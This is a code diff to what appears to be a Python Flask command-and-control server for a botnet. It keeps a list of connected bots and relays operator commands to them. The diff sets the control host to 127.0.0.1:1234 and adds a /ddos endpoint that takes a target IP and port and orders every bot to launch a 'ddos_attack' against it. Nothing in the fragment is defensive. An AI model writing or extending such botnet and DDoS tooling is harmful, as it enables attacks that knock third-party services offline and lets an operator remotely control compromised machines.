@@ -3,15 +3,13 @@
 import socket
 import threading
 import subprocess
-import pwd
 import pyautogui
-import cv2
 import shutil
 from flask import Flask, render_template, request, jsonify
 
 # The IP address and port of the main host
-host = 'YOUR_MAIN_HOST_IP'
-port = YOUR_MAIN_HOST_PORT
+host = '127.0.0.1'
+port = 1234
 
 # List to store the connected bots
 connected_bots = []
@@ -28,6 +26,15 @@ def send_command():
     command = request.form['command']
     results = send_command_to_bots(command)
     return jsonify(results)
+
+@app.route('/ddos', methods=['POST'])
+def ddos():
+    target_ip = request.form['target_ip']
+    target_port = request.form['target_port']
+    command = 'ddos_attack {},{}'.format(target_ip, target_port)
+    results = send_command_to_bots(command)
+    return jsonify(results)
+
 
 @app.route('/bots_location')
 def bots_location():
